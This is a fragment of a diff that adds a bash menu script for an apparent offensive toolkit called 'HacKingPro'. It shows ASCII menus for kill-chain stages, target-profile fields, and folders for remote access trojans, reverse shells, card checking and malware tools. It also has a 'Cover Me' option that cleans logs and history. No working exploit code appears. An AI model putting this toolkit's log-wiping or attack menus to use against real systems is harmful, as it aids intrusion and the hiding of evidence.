+    echo "    ${BGreen}|──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}|──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}└──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    read -p "$Press_ENTER" readthat
+    cd "$XHacKingPro"
+  fi
+
+}
+
+###############################################
+
+# Parsing Date and Time
+year=$(date +%Y)
+month=$(date +%m)
+day=$(date +%d)
+hour=$(date +%H)
+minute=$(date +%M)
+second=$(date +%S)
+CurrentDate=$(echo "${DGrey}$day-$month-$year")
+StartingTime=$(echo "${DGrey}$hour:$minute:$second")
+FullTime=$(date)
+
+# HacKingPro Design
+HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+Anlominus=$(echo "${BGreen}An${DGrey}Lo${BRed}Minus")
+MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}17")
+HacKingProDavid=$(echo "\n\t  ${BRed}[${BCyan}✡${BRed}] ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
+HacKingProExit=$(echo "\n ${BRed}[${BCyan}✡${BRed}] ${BCyan}Exit ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
+Press_ENTER=$(echo "\n\n${BYellow}                🔶    Press ENTER    🔶     ${BGreen}\n\n")
+Press_Enter_To_START=$(echo "\n\n${BYellow}                🔶    Press Enter To START    🔶     ${BGreen}\n\n")
+InvalidOption=$(echo "\n\t\t ${BGreen}»»» ${HacKingPro} ${LRed}Invalid Option ${BRed}¯\_(ツ)_/¯ \n")
+###############################################
+
+ToolHeader=$(echo "
+    ${BGreen}┌──${BRed}[${BCyan} Version ${BRed}]${BGreen}──────╼ ${BRed}[${BCyan} ${MyVersion} ${BRed}]
+    ${BGreen}|──${BRed}[${BCyan} Aouther ${BRed}]${BGreen}──────╼ ${BRed}[${BCyan} ${Anlominus} ${BRed}]
+    ${BGreen}|──${BRed}[${BCyan} Tool Name ${BRed}]${BGreen}────╼ ${BRed}[${BCyan} ${HacKingPro} ${BRed}]
+    ${BGreen}|──${BRed}[${BCyan} Last Update ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} ${LastUPDATE} ${BRed}]
+    ${BGreen}└──${BRed}[${BCyan} Source ${BRed}]${BGreen}───────╼ ${BRed}[${DGrey} ${ToolSource} ${BRed}]")
+
+###############################################
+
+# HacKingPro Logo Variable
+HacKingProLogo(){
+  HacKingProLogo_1="$(
+  echo "${BBlue}
+${BRed}     █████   █████                    ${BYellow}█████   ████  ███                      ${BBlue}███████████
+${BRed}    ░░███   ░░███                    ${BYellow}░░███   ███░  ░░░   ${MyVersion}           ${BBlue}░░███░░░░░███ ${Anlominus}
+${BRed}     ░███    ░███   ██████    ██████  ${BYellow}░███  ███    ████  ████████    ███████ ${BBlue}░███    ░███ ████████   ██████
+${BRed}     ░███████████  ░░░░░███  ███░░███ ${BYellow}░███████    ░░███ ░░███░░███  ███░░███ ${BBlue}░██████████ ░░███░░███ ███░░███
+${BRed}     ░███░░░░░███   ███████ ░███ ░░░  ${BYellow}░███░░███    ░███  ░███ ░███ ░███ ░███ ${BBlue}░███░░░░░░   ░███ ░░░ ░███ ░███
+${BRed}     ░███    ░███  ███░░███ ░███  ███ ${BYellow}░███ ░░███   ░███  ░███ ░███ ░███ ░███ ${BBlue}░███         ░███     ░███ ░███
+${BRed}     █████   █████░░████████░░██████  ${BYellow}█████ ░░████ █████ ████ █████░░███████ ${BBlue}█████        █████    ░░██████
+${BRed}    ░░░░░   ░░░░░  ░░░░░░░░  ░░░░░░  ${BYellow}░░░░░   ░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░███${BBlue}░░░░░        ░░░░░      ░░░░░░
+${BYellow}                                                                    ███ ░███
+${BYellow}                                                                   ░░██████
+${BYellow}                                                                    ░░░░░░                              ")"
+echo "$HacKingProLogo_1"
+# echo "$HacKingProDavid"
+}
+
+# Paths Directories to Tools
+xDirectories(){
+  XHacKingProPWD=$(pwd)
+  XHacKingPro="${XHacKingProPWD}"
+  xAttacKing="${XHacKingPro}/Menu/A--AttacKing/"
+  xMenu00="${XHacKingPro}/Menu/00--Anonymity/"
+  xMenu01="${XHacKingPro}/Menu/01--Information Gathering"
+  xMenu01_CAO="${XHacKingPro}/Menu/01--Information Gathering/CAO - Collecting All in One/"
+  xMenu01_CNI="${XHacKingPro}/Menu/01--Information Gathering/CNI - Collecting Network Information/"
+  xMenu01_CNI_reconFTW="${XHacKingPro}/Menu/01--Information Gathering/CNI - Collecting Network Information/reconFTW/"
+  xMenu01_CMI="${XHacKingPro}/Menu/01--Information Gathering/CMI - Collecting Machine Information/"
+  xMenu01_CSI="${XHacKingPro}/Menu/01--Information Gathering/CSI - Collecting Social Information/"
+  xMenu02="${XHacKingPro}/Menu/02--Scanning & Vulnerability Assessment/"
+  xMenu03="${XHacKingPro}/Menu/03--Web Application HacKing/"
+  xMenu04="${XHacKingPro}/Menu/04--Database Assessment/"
+  xMenu05="${XHacKingPro}/Menu/05--Password HacKing/"
+  xMenu06="${XHacKingPro}/Menu/06--Wireless HacKing/"
+  xMenu07="${XHacKingPro}/Menu/07--Exploit Frameworks & DataBases/"
+  xMenu08="${XHacKingPro}/Menu/08--Post-Exploitation Frameworks/"
+  xMenu09="${XHacKingPro}/Menu/09--Sniffing - Spoofing/"
+  xMenu11="${XHacKingPro}/Menu/11--Digital Forensic/"
+  xMenu12="${XHacKingPro}/Menu/12--Analysis & Reporting/"
+  xMenu14="${XHacKingPro}/Menu/14--Privilege Enumeration & Escalation/"
+  xMenu15="${XHacKingPro}/Menu/15--Malware Tools/"
+  xMenuM="${XHacKingPro}/Menu/M--Monitoring/"
+  xMenuCC="${XHacKingPro}/Menu/CC--Card Checker/"
+  xMenuCL="${XHacKingPro}/Menu/CL--Check Lists/"
+  xMenuCS="${XHacKingPro}/Menu/CS--Cheat Sheets/"
+  xMenuMH="${XHacKingPro}/Menu/MH--Mobile HacKing/"
+  xMenuMV="${XHacKingPro}/Menu/MV--Markdown Viewers/"
+  xMenuPT="${XHacKingPro}/Menu/PT--Penetration Testing/"
+  xMenuRE="${XHacKingPro}/Menu/RE--Reverse Engineering/"
+  xMenuRS="${XHacKingPro}/Menu/RS--Reverse Shell/"
+  xMenuSE="${XHacKingPro}/Menu/SE--Social Engineering/"
+  xMenuAIO="${XHacKingPro}/Menu/AIO--All In One/"
+  xMenuCHT="${XHacKingPro}/Menu/CHT--Car Hacking Tools/"
+  xMenuRAT="${XHacKingPro}/Menu/RAT--Remote Access Trojan/"
+  xMenuSIP="${XHacKingPro}/Menu/SIP--Session Initiation Protocol/"
+  xMenuWFA="${XHacKingPro}/Menu/WFA--FireWall Applications/"
+  # xMenuKoTH="${XHacKingPro}/Menu/KoTH--King of The Hill/"
+
+  # Checking Directories of HacKingPro TooL
+
+  if [ ${MainDirectoriy} == "$HOME/Documents/GitHub/HacKingPro" ]; then
+    #statements
+    XHacKingPro="$HOME/Documents/GitHub/HacKingPro/"
+    # HacKingProLogo1
+    # cd $XHacKingPro
+    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Working Direction: ${BCyan} $XHacKingProPWD\n"
+    ls -lahs
+    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing Menu: ${BCyan} $XHacKingProPWD/Menu\n"
+    ls  Menu
+    echo "\n\n\t\t XHacKingPro=$XHacKingPro"
+    read -p "${Press_Enter_To_START}"
+  else
+    XHacKingPro="$HOME/HacKingPro"
+    # HacKingProLogo1
+    echo "\n\t  ${BYellow}[${BGreen}HOME${BYellow}] ${BGreen}Working Direction: ${BCyan} $XHacKingPro\n"
+    ls -lahs
+    echo "\n\t  ${BYellow}[${BGreen}HOME${BYellow}] ${BGreen}Listing Menu: ${BCyan} $XHacKingPro/Menu\n"
+    ls  Menu
+    read -p "${Press_Enter_To_START}"
+    echo "\n\n\t\t XHacKingPro=$HOME/HacKingPro"
+  fi
+  echo "\n\n\t\t XHacKingPro=${XHacKingPro}"
+  read -p "${Press_Enter_To_START}"
+
+}
+xDirectories
+
+# Arsenal Cheatsheets
+Arsenal(){
+  clear
+  # Getting Arsenal Cheatsheets
+  if [ -d Arsenal ]; then
+    #statements
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Installed  \n"
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}cd Into Arsenal\n"
+    cd Arsenal
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}List Arsenal Directories \n"
+    ls -lahs
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Runnin  \n"
+    ./run
+  fi
+  if [ -d $HOME/opt/anaconda3/bin/arsenal ]; then
+    #statements
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Installed  \n"
+    return
+  else
+    #statements
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Creating Folder Arsenal \n"
+    mkdir Arsenal
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${LYellow}Cloning Into [./Arsenal] \n"
+    git clone https://github.com/Orange-Cyberdefense/Arsenal ./Arsenal
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}cd Into Arsenal\n"
+    cd Arsenal
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}List Arsenal Directories \n"
+    ls -lahs
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Installing Arsenal Requirements \n"
+    python3 -m pip install -r requirements.txt
+    echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Run Installation  \n"
+    ./run
+    if [ $? == 1 ]; then
+      #statements
+      echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Installation ${BRed} ERROR  \n"
+    fi
+    echo "\n\n"
+    echo "\n\t\t ${BRed}[${BCyan}Readed Command${BRed}]${BBlue} - ${BYellow} $ReaDone  \n"
+    read -p "$Press_ENTER" ArsenalCommand
+
+  fi
+  cd ..
+
+}
+
+# HacKingPro Main Menu
+MainMenu(){
+  while true; do
+    # if [ -z "$ArsenalCommand" ]; then
+      # # statements
+      # ArsenalCommand=""
+    # else
+      # echo "Running in new terminal"
+      # (ttab -w $ArsenalCommand)
+      # read -p "$Press_ENTER"
+    # fi
+    cd "$XHacKingPro"
+  #statements
+  clear
+  # HacKingProLogo1
+  HacKingProTargetStatus=$(echo "
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ")
+
+    HacKingProMenuMain=$(echo "${BRed}"
+    # ${DGrey}|──${BRed}[${BYellow} KoTH ${BRed}]${BGreen}── ${BBlack}[${BBlack} 🤴🏼 King of The Hill ⛰ ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 03 ${BRed}]${BGreen}── ${BRed}[${BBlack} Web Application HacKing 🕸 ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 04 ${BRed}]${BGreen}── ${BRed}[${BBlack} Database Assessment ${BRed}]
+    # ${DGrey}|──${BRed}[${DGrey} 05 ${BRed}]${BGreen}── ${BRed}[${DGrey} Password HacKing ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 06 ${BRed}]${BGreen}── ${BRed}[${BBlack} Wireless HacKing 📡 ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 07 ${BRed}]${BGreen}── ${BRed}[${BBlack} Reverse Engineering ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 08 ${BRed}]${BGreen}── ${BRed}[${BBlack} Exploit Frameworks & DataBases ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 09 ${BRed}]${BGreen}── ${BRed}[${BBlack} Sniffing - Spoofing 👃🏼 ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 10 ${BRed}]${BGreen}── ${BRed}[${BBlack} Gaining & Maintaining Access ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 11 ${BRed}]${BGreen}── ${BRed}[${BBlack} Digital Forensic ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 12 ${BRed}]${BGreen}── ${BRed}[${BBlack} Analysis & Reporting ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 13 ${BRed}]${BGreen}── ${BRed}[${BBlack} Social Engineering ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 14 ${BRed}]${BGreen}── ${BRed}[${BBlack} Privilege Enumeration & Escalation ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 15 ${BRed}]${BGreen}── ${BRed}[${BBlack} Malware Analysis Labs/Tools ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 16 ${BRed}]${BGreen}── ${BRed}[${BBlack} Covering Tracks 🫣 ${BRed}]
+    echo "$HacKingProTargetStatus""
+    ${DGrey}┌──${BRed}[${BYellow} ${HacKingPro} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 00 ${BRed}]${BGreen}── ${BRed}[${BGreen} Anonymity ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──┲${BRed}[${BGreen} info ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Reconnaissance & Information Gathering${BRed}]
+    ${DGrey}|  ┖┲──${BRed}[${DGrey} CAO ${BRed}]${BGreen}── ${BRed}[${DGrey} All in One ${BRed}]
+    ${DGrey}|   |
+    ${DGrey}|   ┝┲─${BRed}[${DGrey} CMI ${BRed}]${BGreen}── ${BRed}[${DGrey} Machine Information ${BRed}]
+    ${DGrey}|   |┖─┲──${BRed}[${DGrey} m0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Arp Scan ${BRed}]
+    ${DGrey}|   |  |──${BRed}[${DGrey} m1 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} TraceRoute Scan ${BRed}]
+    ${DGrey}|   |  |──${BRed}[${DGrey} m2 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Ping Scan ${BRed}]
+    ${DGrey}|   |  |──${BRed}[${DGrey} m3 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nslookup Scan ${BRed}]
+    ${DGrey}|   |  |──${BRed}[${DGrey} m4 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dig Scan ${BRed}]
+    ${DGrey}|   |  |──${BRed}[${DGrey} m5 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} WhoIs Scan ${BRed}]
+    ${DGrey}|   |  |──${BRed}[${DGrey} m6 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dirb Scan ${BRed}]
+    ${DGrey}|   |  ┖──${BRed}[${DGrey} m7 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nmap Scan ${BRed}]
+    ${DGrey}|   |
+    ${DGrey}|   |──${BRed}[${DGrey} CNI ${BRed}]${BGreen}── ${BRed}[${DGrey} Network Information ${BRed}]
+    ${DGrey}|   |
+    ${DGrey}|   |──${BRed}[${DGrey} CSI ${BRed}]${BGreen}── ${BRed}[${DGrey} Social Information ${BRed}]
+    ${DGrey}|   |
+    ${DGrey}|   ┖──${BRed}[${DGrey} CLI ${BRed}]${BGreen}── ${BRed}[${DGrey} Local Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 2 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Weaponization ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 3 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Delivery ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 4 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Exploitation ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 5 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Installation ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 6 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command and Control ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BGreen} 7 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Actions on Objective ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
+
+    ${DGrey}┌──${BRed}[${DGrey} AnyTool ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Many Systems HacKing Tools Downloader ${HacKingPro} ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} About ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Information About The ${HacKingPro} Tool ${BRed}]
+
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    read -p "$HacKingProMenuMain" cmd
+    case $cmd in
+      any|Any )
+      cd Menu
+      cd AnyTool
+      sh AnyTool
+      cd "$MainDirectoriy"
+      ;;
+      ht|hacktricks|HackTricks )
+      HackTricks
+      ;;
+      lh|lockheed|Lockheed )
+      Lockheed
+      ;;
+      about|About )
+      about
+      ;;
+      a|A|AttacKing )
+      AttacKing
+      ;;
+      alt|alternative|Alternative|Parrot|parrot )
+      AlternativeMenu
+      ;;
+      test )
+      clear
+      DoSomething=$(arp -a)
+      PrintSomeThing=$(echo "\n\n$(date)\n\n$DoSomething" )
+      echo "$PrintSomeThing"
+      read -p "$Press_ENTER"
+      ;;
+      ls )
+      ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
+      echo "$ls_lahs"
+      sleep 2
+      ls -lahs
+      sleep 2
+      read -p "$ls_lahs" cmd
+      ;;
+      p|P )
+      HacKingProPlanning
+      ;;
+      0|00 )
+      clear
+      # HacKingProLogo1
+      Anonymity(){
+        while true; do
+        #statements
+        cd "$xMenu00"
+        clear
+        # HacKingProLogo1
+        HacKingProMenuMain=$(
+        echo "${BRed}
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌──${BRed}[${BYellow} Anonimity ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${BWhite} 01 ${BRed}]${BGreen}── ${BRed}[${BWhite} Cover Me ${BRed}]${BGreen}── ${BRed}[${BWhite} Clean Logs & History${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Anonymity ${BRed}]${BGreen}──╼ ${BGreen}   ")
+          read -p "$HacKingProMenuMain" cmd
+          case $cmd in
+            p|P )
+            HacKingProPlanning
+            ;;
+            ls )
+            ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}")"
+            echo "$ls_lahs"
+            sleep 2
+            ls -lahs
+            sleep 2
+            read -p "$ls_lahs" cmd
+            ;;
+            1|01 )
+            clear
+            CoverMe
+            ;;
+            2|02 )
+            clear
+            echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] Starting Nullog \n\t\t ${BGreen}"
+            sh $xMenu00/Nullog/nullog.sh
+            ;;
+            x|X|exit|EXIT )
+            cd $XHacKingPro
+            clear
+            break
+            ;;
+        esac
+      done
+      }
+      Anonymity
+      ;;
+      info )
+      clear
+      # Page Header
+      while true; do
+        #statements
+        cd "$xMenu01"
+        clear
+        # HacKingProLogo1
+        HacKingProMenuMain=$(echo "${BRed}
+        ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌──${BRed}[${BYellow} Information Gathering ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} CAO ${BRed}]${BGreen}── ${BRed}[${DGrey} All in One ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} CMI ${BRed}]${BGreen}── ${BRed}[${DGrey} Machine Information ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} CNI ${BRed}]${BGreen}── ${BRed}[${DGrey} Network Information ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} CSI ${BRed}]${BGreen}── ${BRed}[${DGrey} Social Information ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} CLI ${BRed}]${BGreen}── ${BRed}[${DGrey} Local Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BGreen}   ")
+
+          read -p "$HacKingProMenuMain" cmd
+          case $cmd in
+            ls )
+            ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}")"
+            echo "$ls_lahs"
+            sleep 2
+            ls -lahs
+            sleep 2
+            read -p "$ls_lahs" cmd
+            ;;
+            p|P )
+            HacKingProPlanning
+            ;;
+            x|X|exit|quit|Exit )
+            clear
+            cd ${XHacKingPro}
+            HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+            echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+            break
+            ;;
+            cao|CAO )
+            while true; do
+              #statements
+              cd $xMenu01_CMI
+              clear
+              # HacKingProLogo1
+              HacKingProMenuMain=$(echo "${BRed}
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
